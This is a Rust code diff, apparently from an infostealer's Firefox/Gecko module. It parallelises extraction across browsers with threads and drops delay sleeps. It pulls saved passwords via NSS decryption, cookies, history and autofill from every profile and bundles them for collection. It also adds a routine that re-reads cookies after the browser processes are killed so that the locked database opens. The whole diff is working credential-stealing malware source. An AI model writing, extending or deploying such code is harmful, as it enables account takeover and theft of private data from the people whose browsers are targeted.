@@ -165,27 +165,72 @@ pub fn find_nss_dir(browser_name: &str) -> Option<PathBuf> {
     None
 }
 
-pub fn extract_all() -> Vec<(String, String)> {
-    std::thread::sleep(std::time::Duration::from_millis(500));
+fn extract_browser(browser: &GeckoBrowserInfo) -> Vec<(String, String)> {
+    if !browser.profiles_path.exists() {
+        return Vec::new();
+    }
+    let nss_dir = find_nss_dir(&browser.name);
+    let profiles = base::get_profiles(&browser.profiles_path);
     let mut results = Vec::new();
+
+    for (profile_name, profile_path) in profiles {
+        let passwords = nss_dir
+            .as_ref()
+            .and_then(|dir| base::extract_passwords_nss(&profile_path, dir));
+        let cookies = base::extract_cookies(&profile_path);
+        let history = base::extract_history(&profile_path);
+        let autofill = base::extract_autofill(&profile_path);
+
+        crate::browsers::common::zipp::push_profile_bundle(
+            &mut results,
+            &browser.name,
+            &profile_name,
+            passwords,
+            cookies,
+            autofill,
+            history,
+        );
+    }
+    results
+}
+
+pub fn extract_all() -> Vec<(String, String)> {
     let browsers = get_browsers();
+    let handles: Vec<_> = browsers
+        .into_iter()
+        .map(|browser| std::thread::spawn(move || extract_browser(&browser)))
+        .collect();
+
+    let mut results = Vec::new();
+    for handle in handles {
+        if let Ok(files) = handle.join() {
+            results.extend(files);
+        }
+    }
+    results
+}
+
+/// Re-extract cookies after Firefox/Gecko processes are killed (DB unlocked).
+pub fn extract_cookies_post_kill() -> Vec<(String, String)> {
+    let browsers = get_browsers();
+    let mut results = Vec::new();
     for browser in browsers {
-        if !browser.profiles_path.exists() { continue; }
-        let nss_dir = find_nss_dir(&browser.name);
+        if !browser.profiles_path.exists() {
+            continue;
+        }
         let profiles = base::get_profiles(&browser.profiles_path);
-
         for (profile_name, profile_path) in profiles {
-            std::thread::sleep(std::time::Duration::from_millis(200));
-            let passwords = nss_dir.as_ref()
-                .and_then(|dir| base::extract_passwords_nss(&profile_path, dir));
-            let cookies = base::extract_cookies(&profile_path);
-            let history = base::extract_history(&profile_path);
-            let autofill = base::extract_autofill(&profile_path);
-
-            crate::browsers::common::zipp::push_profile_bundle(
-                &mut results, &browser.name, &profile_name,
-                passwords, cookies, autofill, history,
-            );
+            if let Some(cookies) = base::extract_cookies(&profile_path) {
+                crate::browsers::common::zipp::push_profile_bundle(
+                    &mut results,
+                    &browser.name,
+                    &profile_name,
+                    None,
+                    Some(cookies),
+                    None,
+                    None,
+                );
+            }
         }
     }
     results
